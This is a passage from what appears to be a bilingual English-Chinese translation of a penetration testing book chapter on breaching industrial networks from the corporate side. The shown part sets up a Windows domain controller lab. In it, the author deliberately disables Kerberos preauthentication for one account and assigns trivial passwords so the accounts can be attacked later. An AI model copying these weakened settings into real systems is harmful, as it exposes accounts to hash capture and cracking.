- en: '*Chapter 10*: I Can Do It 420'
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: '*第10章*: 我能做到 420'
- en: 'Up till now, there has been a heavy focus on automation – understanding what
    a PLC is and how it communicates. A key topic discussed was connectivity – specifically,
    connecting the PLC to the physical I/O, and also connecting it back up to SCADA.
    We also learned about Modbus and Ethernet/IP, and how to interact with the I/O.
    Additionally, we discussed using various tools to scan and enumerate ports and
    services in order to discover what protocols could be running in the environment.
    In the last chapter, we looked at using Burp Suite to interact with Ignition,
    our web-hosted SCADA system. All these tools and skills are critical to completing
    a successful engagement. However, we have in actuality spent most of our time
    looking at the SCADA and physical hardware side of the network. Depending on your
    engagement, typically considered **white box**, it is possible that the customer
    will drop you into the ICS network and basically give you free run to do discovery,
    and provide you with the following: an **Active Directory** (**AD**) account and
    a diagram of the ICS network. This allows you to avoid the pitfalls of traversing
    the corporate side of the network, and instead move down through **demilitarized
    zones**, past **firewalls**, and into new **domains**.'
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 到目前为止，我们主要关注自动化——了解 PLC 是什么以及它如何通信。我们讨论的一个关键话题是连接性——特别是将 PLC 连接到物理 I/O，以及如何将其连接回
    SCADA。我们还了解了 Modbus 和 Ethernet/IP，并学习了如何与 I/O 交互。此外，我们还讨论了使用各种工具来扫描和枚举端口和服务，以发现环境中可能运行的协议。在上一章中，我们探讨了如何使用
    Burp Suite 与 Ignition，我们的 Web 托管 SCADA 系统进行交互。所有这些工具和技能对于完成成功的渗透测试至关重要。然而，实际上我们大部分时间都花在了查看
    SCADA 和物理硬件方面的网络。根据你的渗透测试，通常被视为**白盒**测试，客户可能会将你放入 ICS 网络，并基本上给你自由进行发现，并提供以下内容：一个**Active
    Directory**（**AD**）帐户和 ICS 网络的图示。这使你避免了穿越公司网络的陷阱，反而可以通过**非军事区**、穿越**防火墙**，进入新的**域**。
- en: Justice wouldn't be done if this was all we focused on in this chapter. In most
    engagements, I have been typically thrown into the corporate side of the network,
    then asked to breach into the industrial network. Doing this requires an understanding
    of the technology present in the industrial network. This understanding will allow
    us to gain a foothold to go deeper into the network. Here, we are going to add
    a couple more elements to our ever-growing lab. We will be simulating a **gray
    box** test where you will be dropped into the **corporate network**, and subsequently
    discover a path through.
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 如果本章仅聚焦于这些内容，那将是不公平的。在大多数渗透测试中，我通常被丢到公司网络的一侧，然后被要求突破进入工业网络。做到这一点需要理解工业网络中存在的技术。这样的理解将使我们能够获得立足点，进一步深入网络。在这里，我们将为我们日益扩展的实验室添加一些新元素。我们将模拟一个**灰盒**测试，在这个测试中，你将被放入**公司网络**，然后发现一条穿越的路径。
- en: 'In this chapter, we''re going to cover the following main topics:'
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 本章我们将涵盖以下主要主题：
- en: Installing corporate environment elements
  id: totrans-4
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 安装企业环境元素
- en: Discovering and launching our attacks
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 发现并发起我们的攻击
- en: Getting shells
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 获取 shell
- en: Technical requirements
  id: totrans-7
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 技术要求
- en: 'For this chapter, you will need the following:'
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: 本章内容，你将需要以下资源：
- en: 'A Windows 2019 domain controller, installed and configured. Click on the following
    link to download an ISO for the server of your choice: [https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2019](https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2019).'
  id: totrans-9
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 一台已安装并配置好的 Windows 2019 域控制器。点击以下链接下载你选择的服务器的 ISO：[https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2019](https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2019)。
- en: 'A Windows 10 workstation connected to the domain controller. Click on the following
    link to get access to a Windows 10 ISO: [https://www.microsoft.com/en-ca/software-download/windows10ISO](https://www.microsoft.com/en-ca/software-download/windows10ISO).'
  id: totrans-10
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 一台连接到域控制器的 Windows 10 工作站。点击以下链接获取 Windows 10 ISO 的访问权限：[https://www.microsoft.com/en-ca/software-download/windows10ISO](https://www.microsoft.com/en-ca/software-download/windows10ISO)。
- en: 'A Kali Linux VM already running, and with the following tools installed:'
  id: totrans-11
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 一台已经运行的 Kali Linux 虚拟机，并安装了以下工具：
- en: '**Impacket**: This is available here: [https://github.com/SecureAuthCorp/impacket/releases](https://github.com/SecureAuthCorp/impacket/releases).'
  id: totrans-12
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Impacket**：可以在这里获取：[https://github.com/SecureAuthCorp/impacket/releases](https://github.com/SecureAuthCorp/impacket/releases)。'
- en: '**Kerbrute**: This is available here: [https://github.com/ropnop/kerbrute/releases/tag/v1.0.3](https://github.com/ropnop/kerbrute/releases/tag/v1.0.3).'
  id: totrans-13
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Kerbrute**：可在此处下载：[https://github.com/ropnop/kerbrute/releases/tag/v1.0.3](https://github.com/ropnop/kerbrute/releases/tag/v1.0.3)。'
- en: '**Evil-WinRM**: This is available here: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm).'
  id: totrans-14
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Evil-WinRM**：可在此处下载：[https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)。'
- en: 'You can view this chapter''s code in action here: [https://bit.ly/3AzpxFp](https://bit.ly/3AzpxFp)'
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以在此处查看本章代码的实际操作：[https://bit.ly/3AzpxFp](https://bit.ly/3AzpxFp)
- en: Installing corporate environment elements
  id: totrans-16
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 安装企业环境元素
- en: 'In [*Chapter 1*](B16321_01_Epub_AM.xhtml#_idTextAnchor013), *Using Virtualization*,
    we installed four **virtual machines** (**VMs**), consisting of two Ubuntu, one
    Windows 7, and one Kali Linux distribution. We then proceeded to create subnets
    based on the **Purdue model**, and then assigned static IP addresses to those
    individual VMs, aligning them individually to their respective organizational
    network levels. In this section, we are going to add the corporate side of an
    ICS lab by setting up a Windows 2019 domain controller running AD, **Domain Name
    System** (**DNS**), and a **Dynamic Host Configuration Protocol** (**DHCP**) server.
    We will also connect a Windows 10 workstation to the domain. As a refresher, our
    lab should currently look something like the following figure:'
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 在[*第1章*](B16321_01_Epub_AM.xhtml#_idTextAnchor013)中，*使用虚拟化*，我们安装了四台**虚拟机**（**VMs**），其中包括两台
    Ubuntu、一台 Windows 7 和一台 Kali Linux 分发版。接着，我们基于**普渡模型**创建了子网，并为这些虚拟机分配了静态 IP 地址，将它们分别对齐到各自的组织网络层级。在本节中，我们将通过设置运行
    AD 的 Windows 2019 域控制器来添加企业侧的 ICS 实验室，并配置**域名系统**（**DNS**）和**动态主机配置协议**（**DHCP**）服务器。我们还将一台
    Windows 10 工作站连接到该域。作为复习，我们的实验室目前应该看起来像下图所示：
- en: '![Figure 10.1 – Current lab layout'
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: '![图10.1 – 当前实验室布局'
- en: '](image/Figure_10.01_B16321.jpg)'
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/Figure_10.01_B16321.jpg)'
- en: Figure 10.1 – Current lab layout
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: 图10.1 – 当前实验室布局
- en: 'Once you complete the setup of the domain controller and workstation, your
    network layout should appear similar to the following figure:'
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦完成域控制器和工作站的设置，你的网络布局应该类似于下图所示：
- en: '![Figure 10.2 – Corporate lab additions'
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: '![图10.2 – 企业实验室新增'
- en: '](image/Figure_10.02_B16321.jpg)'
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/Figure_10.02_B16321.jpg)'
- en: Figure 10.2 – Corporate lab additions
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
  zh: 图10.2 – 企业实验室新增
- en: Next, we'll take a look at installing and configuring the domain controller.
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们将看看如何安装和配置域控制器。
- en: Installing and configuring the domain controller
  id: totrans-26
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 安装和配置域控制器
- en: 'Navigate to the following link to find the ISO related to the domain controller
    lab: [https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2019](https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2019).'
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: 访问以下链接以查找与域控制器实验室相关的 ISO 文件：[https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2019](https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2019)。
- en: 'I am now going to list the steps that we will take to install and configure
    the domain controller. However, I will not cover some of the more obvious steps,
    nor will I restate anything that we covered in [*Chapter 1*](B16321_01_Epub_AM.xhtml#_idTextAnchor013),
    *Using Virtualization*. If you need a refresher on getting an ISO into the datastore
    of your ESXi server, I recommend going back to [*Chapter 1*](B16321_01_Epub_AM.xhtml#_idTextAnchor013),
    *Using Virtualization*. The following are the steps required:'
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我将列出安装和配置域控制器的步骤。不过，我不会覆盖一些显而易见的步骤，也不会重新讲解在[*第1章*](B16321_01_Epub_AM.xhtml#_idTextAnchor013)中讲过的内容，*使用虚拟化*。如果你需要复习如何将
    ISO 文件放入 ESXi 服务器的数据存储中，建议回到[*第1章*](B16321_01_Epub_AM.xhtml#_idTextAnchor013)进行复习。以下是所需的步骤：
- en: I am going to assume that you can get the ISO spun up, as well as getting the
    domain controller to the Windows Update portion of the steps. Now refer to the
    following screenshot, as this is where we will pick up the installation and configuration
    portion:![Figure 10.3 – Windows Update
  id: totrans-29
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我假设你已经完成了 ISO 文件的加载，并且将域控制器带到 Windows 更新步骤部分。现在参考以下截图，这是我们将继续安装和配置部分的位置：![图10.3
    – Windows 更新
- en: '](image/Figure_10.03_B16321.jpg)'
  id: totrans-30
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/Figure_10.03_B16321.jpg)'
- en: Figure 10.3 – Windows Update
  id: totrans-31
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图10.3 – Windows 更新
- en: From here we want to disable the **VM Network** interface and set a static IP
    address to **127.0.0.1** for the preferred DNS server, as shown in the following
    screenshot:![Figure 10.4 – Enterprise interface
  id: totrans-32
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，我们需要禁用**VM 网络**接口，并将首选 DNS 服务器的静态 IP 地址设置为**127.0.0.1**，如下图所示：![图10.4 –
    企业接口
- en: '](image/Figure_10.04_B16321.jpg)'
  id: totrans-33
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/Figure_10.04_B16321.jpg)'
- en: Figure 10.4 – Enterprise interface
  id: totrans-34
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.4 – 企业界面
- en: Next, we are going to change the name of the machine. I will be using the name
    **dc01**, as shown in the following screenshot:![Figure 10.5 – Changing the name
    of the machine
  id: totrans-35
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，我们将更改计算机的名称。我将使用名称**dc01**，如下图所示：[图 10.5 – 更改计算机名称
- en: '](image/Figure_10.05_B16321.jpg)'
  id: totrans-36
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/Figure_10.05_B16321.jpg)'
- en: Figure 10.5 – Changing the name of the machine
  id: totrans-37
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.5 – 更改计算机名称
- en: Your machine will now require a restart to have the name change be applied.
    You will be prompted with a popup that allows you to restart the system. Once
    the server reboots, we want to navigate to the **Server Manager** screen and select
    **Add roles and features**, as seen in the next screenshot:![Figure 10.6 – Add
    roles and features
  id: totrans-38
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，计算机需要重启才能应用名称更改。系统会弹出一个窗口，允许你重启系统。服务器重启后，我们需要导航到**服务器管理器**屏幕并选择**添加角色和功能**，如下图所示：[图
    10.6 – 添加角色和功能
- en: '](image/Figure_10.06_B16321.jpg)'
  id: totrans-39
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/Figure_10.06_B16321.jpg)'
- en: Figure 10.6 – Add roles and features
  id: totrans-40
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.6 – 添加角色和功能
- en: 'You will be prompted with a **Select installation type** screen, where you
    want to select **Next >**, as seen in the following screenshot:'
  id: totrans-41
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 系统会提示你进入**选择安装类型**屏幕，在此选择**下一步 >**，如下图所示：
- en: '![Figure 10.7 – Select installation type'
  id: totrans-42
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 10.7 – 选择安装类型'
- en: '](image/Figure_10.07_B16321.jpg)'
  id: totrans-43
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/Figure_10.07_B16321.jpg)'
- en: Figure 10.7 – Select installation type
  id: totrans-44
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.7 – 选择安装类型
- en: Next, you will be presented with a **Select destination server** screen, and
    from here you want to make sure that you have selected your primary server and
    clicked **Next >**, as shown in the following screenshot:![Figure 10.8 – Select
    destination server
  id: totrans-45
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，系统会提示你进入**选择目标服务器**屏幕，在此你需要确保选择了你的主服务器并点击**下一步 >**，如下图所示：[图 10.8 – 选择目标服务器
- en: '](image/Figure_10.08_B16321.jpg)'
  id: totrans-46
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/Figure_10.08_B16321.jpg)'
- en: Figure 10.8 – Select destination server
  id: totrans-47
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.8 – 选择目标服务器
- en: From here, you will be presented with a series of roles that you can choose
    from. We want to select **Active Directory Domain Services**, **DHCP Server**,
    and **DNS Server**, as shown in the following screenshot:![Figure 10.9 – Select
    server roles
  id: totrans-48
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 从这里，你将看到一系列的角色供你选择。我们需要选择**Active Directory 域服务**、**DHCP 服务器**和**DNS 服务器**，如下图所示：[图
    10.9 – 选择服务器角色
- en: '](image/Figure_10.09_B16321.jpg)'
  id: totrans-49
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/Figure_10.09_B16321.jpg)'
- en: Figure 10.9 – Select server roles
  id: totrans-50
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.9 – 选择服务器角色
- en: After selecting each checkbox, you will be presented with a popup that provides
    details on the role that you will be installing. Click the **Add feature** button
    to confirm each role is selected. You will then see the **Select features** window.
    Simply click **Next >** without selecting any features (except for the ones which
    are selected by default) to continue the installation process, as shown in the
    following screenshot:![Figure 10.10 – Select features
  id: totrans-51
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 选择每个复选框后，系统会弹出一个窗口，提供有关你将要安装的角色的详细信息。点击**添加功能**按钮确认每个角色的选择。然后你将看到**选择功能**窗口。只需点击**下一步
    >**而不选择任何功能（除非是默认选中的功能）即可继续安装过程，如下图所示：[图 10.10 – 选择功能
- en: '](image/Figure_10.10_B16321.jpg)'
  id: totrans-52
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/Figure_10.10_B16321.jpg)'
- en: Figure 10.10 – Select features
  id: totrans-53
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.10 – 选择功能
- en: Click the **Next >** button through the **AD DS**, **DHCP Server**, and **DNS
    Server** info screens. You will then arrive at the **Confirm installation selections**
    screen, where you can continue by clicking the **Install** button:![Figure 10.11
    – Confirm installation selections
  id: totrans-54
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 点击**下一步 >**按钮，依次通过**AD DS**、**DHCP 服务器**和**DNS 服务器**信息屏幕。然后，你将进入**确认安装选择**屏幕，可以通过点击**安装**按钮继续：[图
    10.11 – 确认安装选择
- en: '](image/Figure_10.11_B16321.jpg)'
  id: totrans-55
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/Figure_10.11_B16321.jpg)'
- en: Figure 10.11 – Confirm installation selections
  id: totrans-56
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.11 – 确认安装选择
- en: Once installed, you will be brought to an **Installation progress** screen where
    you will click the **Promote this server to a domain controller** option, as shown
    in the following screenshot:![Figure 10.12 – Promoting the domain controller
  id: totrans-57
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 安装完成后，系统会进入**安装进度**屏幕，你需要点击**将此服务器提升为域控制器**选项，如下图所示：[图 10.12 – 提升域控制器
- en: '](image/Figure_10.12_B16321.jpg)'
  id: totrans-58
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/Figure_10.12_B16321.jpg)'
- en: Figure 10.12 – Promoting the domain controller
  id: totrans-59
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.12 – 提升域控制器
- en: Here, you are going to select the **Add a new forest** option. Then set the
    domain name to **labcorp.local** and click the **Next >** button:![Figure 10.13
    – Deployment Configuration
  id: totrans-60
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在这里，你将选择**添加一个新森林**选项。然后将域名设置为**labcorp.local**，并点击**下一步 >**按钮：![图 10.13 – 部署配置
- en: '](image/Figure_10.13_B16321.jpg)'
  id: totrans-61
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/Figure_10.13_B16321.jpg)'
- en: Figure 10.13 – Deployment Configuration
  id: totrans-62
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.13 – 部署配置
- en: Next, you will see **Domain Controller Options**. Keep everything as it is and
    set your **Directory Services Restore Mode** (**DSRM**) password, as shown in
    the following screenshot:![Figure 10.14 – Domain Controller Options
  id: totrans-63
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，你将看到**域控制器选项**。保持所有设置不变，并设置你的**目录服务恢复模式**（**DSRM**）密码，如下所示的截图所示：![图 10.14
    – 域控制器选项
- en: '](image/Figure_10.14_B16321.jpg)'
  id: totrans-64
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/Figure_10.14_B16321.jpg)'
- en: Figure 10.14 – Domain Controller Options
  id: totrans-65
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.14 – 域控制器选项
- en: Click **Next >** through the DNS options without selecting **Create DNS delegation**.
    You then will be presented with **Additional Options**. In this window, the NetBIOS
    domain name will be auto-generated for you. Click **Next >** and then click **Next
    >** again on the **Paths** screen. Click **Next >** once again on the **Review
    Options** screen. Doing this will begin the prerequisites check. From here, we
    want to click **Install**, as depicted in the following screenshot:![Figure 10.15
    – Prerequisites Check
  id: totrans-66
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 点击**下一步 >**，通过 DNS 选项，但不要选择**创建 DNS 委派**。然后，你将看到**附加选项**窗口。在这个窗口中，NetBIOS 域名将自动为你生成。点击**下一步
    >**，然后在**路径**页面上再次点击**下一步 >**。在**审查选项**页面上，再次点击**下一步 >**。这样做将开始先决条件检查。从这里开始，我们点击**安装**，如下所示的截图所示：![图
    10.15 – 先决条件检查
- en: '](image/Figure_10.15_B16321.jpg)'
  id: totrans-67
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/Figure_10.15_B16321.jpg)'
- en: Figure 10.15 – Prerequisites Check
  id: totrans-68
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.15 – 先决条件检查
- en: Once the installation finishes, you will be logged out and the server will reboot.
    Once the system comes back up, you will see that you now have a **LABCORP** domain,
    as shown in the following screenshot:![Figure 10.16 – LABCORP domain
  id: totrans-69
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 安装完成后，你将会被注销，服务器会重新启动。系统重新启动后，你将看到现在已经拥有了**LABCORP**域，如下所示的截图：![图 10.16 – LABCORP
    域
- en: '](image/Figure_10.16_B16321.jpg)'
  id: totrans-70
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/Figure_10.16_B16321.jpg)'
- en: Figure 10.16 – LABCORP domain
  id: totrans-71
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.16 – LABCORP 域
- en: Now that we have AD installed, we want to quickly add a domain admin to continue
    with the next two server configurations. Go ahead and add a new user under **Active
    Directory Users and Computers**, as shown here:![Figure 10.17 – Users and Computers
  id: totrans-72
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在我们已经安装了 AD，接下来我们要快速添加一个域管理员，以继续进行接下来的两个服务器配置。请继续在**Active Directory 用户和计算机**中添加一个新用户，如下所示：![图
    10.17 – 用户和计算机
- en: '](image/Figure_10.17_B16321.jpg)'
  id: totrans-73
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/Figure_10.17_B16321.jpg)'
- en: Figure 10.17 – Users and Computers
  id: totrans-74
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.17 – 用户和计算机
- en: I have used **lab.da:Password123** as my credentials and set the new user to
    be a member of **Domain Admins**, as shown here:![Figure 10.18 – Domain Admins
  id: totrans-75
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我使用了**lab.da:Password123**作为我的凭证，并将新用户设置为**Domain Admins**的成员，如下所示：![图 10.18
    – 域管理员
- en: '](image/Figure_10.18_B16321.jpg)'
  id: totrans-76
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/Figure_10.18_B16321.jpg)'
- en: Figure 10.18 – Domain Admins
  id: totrans-77
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.18 – 域管理员
- en: 'Since you are already adding a domain admin, you will continue and add **LabGroups**
    and **LabUsers** as an organizational unit under the **labcorp.local** domain,
    as shown here:'
  id: totrans-78
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 由于你已经添加了一个域管理员，你将继续并将**LabGroups**和**LabUsers**作为**labcorp.local**域下的组织单元添加，如下所示：
- en: '![Figure 10.19 – Organizational groups'
  id: totrans-79
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 10.19 – 组织组'
- en: '](image/Figure_10.19_B16321.jpg)'
  id: totrans-80
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/Figure_10.19_B16321.jpg)'
- en: Figure 10.19 – Organizational groups
  id: totrans-81
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.19 – 组织组
- en: 'Next, you will create a group under the **LabGroups** organizational unit,
    named **Scada**:'
  id: totrans-82
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，你将在**LabGroups**组织单元下创建一个名为**Scada**的组：
- en: '![Figure 10.20 – Scada group'
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.20 – Scada 组'
- en: '](image/Figure_10.20_B16321.jpg)'
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/Figure_10.20_B16321.jpg)'
- en: Figure 10.20 – Scada group
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.20 – Scada 组
- en: 'Now, you want to create three new users and add them to the **LabUsers** organizational
    unit. The users will be as follows:'
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，你要创建三个新用户，并将它们添加到**LabUsers**组织单元中。用户信息如下：
- en: '**operator1**/**Password1**'
  id: totrans-87
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**operator1**/**Password1**'
- en: '**operator2**/**Password2**'
  id: totrans-88
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**operator2**/**Password2**'
- en: '**operator3**/**Password3**'
  id: totrans-89
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**operator3**/**Password3**'
- en: 'Here is an example using **operator1**, setting the password to be **Password1234**,
    and making them a member of **Scada**:'
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: 这是一个示例，使用**operator1**，将密码设置为**Password1234**，并使其成为**Scada**组的成员：
- en: '![Figure 10.21 – LabUsers operator1'
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.21 – LabUsers operator1'
- en: '](image/Figure_10.21_B16321.jpg)'
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/Figure_10.21_B16321.jpg)'
- en: Figure 10.21 – LabUsers operator1
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.21 – LabUsers operator1
- en: 'When creating the **operator2** account, we are going to adjust a particular
    setting that will be discussed in the next section. Under **Users and Computers**,
    we want to select **operator2**, and then select the **Account** tab. Then, under
    the **Account** options, select the **Do not require Kerberos preauthentication
    option**. This is ultimately a protection mechanism against Kerberos brute force.
    If it is disabled, we can capture hashes for the users that are not using this
    feature:'
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: 在创建**operator2**账户时，我们将调整一个特定设置，下一节将讨论此设置。在**用户和计算机**中，我们需要选择**operator2**，然后选择**账户**选项卡。接着，在**账户**选项下，选择**不要求
    Kerberos 预身份验证**选项。这最终是防止 Kerberos 暴力破解的保护机制。如果禁用此功能，我们可以捕获未使用此功能的用户的哈希值：
- en: '![Figure 10.22 – Disable Kerberos preauthentication'
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.22 – 禁用 Kerberos 预身份验证'
- en: '](image/Figure_10.22_B16321.jpg)'
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/Figure_10.22_B16321.jpg)'
- en: Figure 10.22 – Disable Kerberos preauthentication
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.22 – 禁用 Kerberos 预身份验证
- en: Now that we have disabled Kerberos preauthentication, we will continue installing
    and configuring the DNS server.
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经禁用 Kerberos 预身份验证，我们将继续安装并配置 DNS 服务器。
- en: Adding and installing the DNS server
  id: totrans-99
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 添加并安装 DNS 服务器
- en: 'The next step will be to sign out of the local administrator account and log
    back into the server as **labcorp\lab.da** to continue with the configuration
    of the DNS server:'
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: 下一步是退出本地管理员账户，并以**labcorp\lab.da**重新登录到服务器，继续配置 DNS 服务器：
- en: On the **Server Manager** dashboard, select the **DNS** option from the menu
    on the left-hand side. This will bring up a list of servers that can be configured
    for the DNS. Select the **DC01** server and right-click on it. This will bring
    up a context menu, allowing us to select **DNS Manager**:![Figure 10.23 – DNS
    server
  id: totrans-101
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在**服务器管理器**仪表盘上，从左侧菜单中选择**DNS**选项。这将列出可以配置为 DNS 的服务器。选择**DC01**服务器，右键点击它。这将弹出一个上下文菜单，允许我们选择**DNS
    管理器**：![图 10.23 – DNS 服务器
- en: '](image/Figure_10.23_B16321.jpg)'
  id: totrans-102
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/Figure_10.23_B16321.jpg)'
- en: Figure 10.23 – DNS server
  id: totrans-103
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.23 – DNS 服务器
- en: '**DNS Manager** will generate a popup, listing the servers that you have the
    ability to add zones to. We are going to create a new zone under the **Reverse
    Lookup Zones** folder:![Figure 10.24 – DNS Manager'
  id: totrans-104
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: '**DNS 管理器**会弹出一个窗口，列出你可以添加区域的服务器。我们将要在**反向查找区域**文件夹下创建一个新区域：![图 10.24 – DNS
    管理器'
- en: '](image/Figure_10.24_B16321.jpg)'
  id: totrans-105
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/Figure_10.24_B16321.jpg)'
- en: Figure 10.24 – DNS Manager
  id: totrans-106
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.24 – DNS 管理器
- en: Here, we want to select **Primary zone** and then click the **Next >** button:![Figure
    10.25 – New zone wizard
  id: totrans-107
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在这里，我们需要选择**主区域**，然后点击**下一步 >** 按钮：![图 10.25 – 新区域向导
- en: '](image/Figure_10.25_B16321.jpg)'
  id: totrans-108
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/Figure_10.25_B16321.jpg)'
- en: Figure 10.25 – New zone wizard
  id: totrans-109
  prefs:
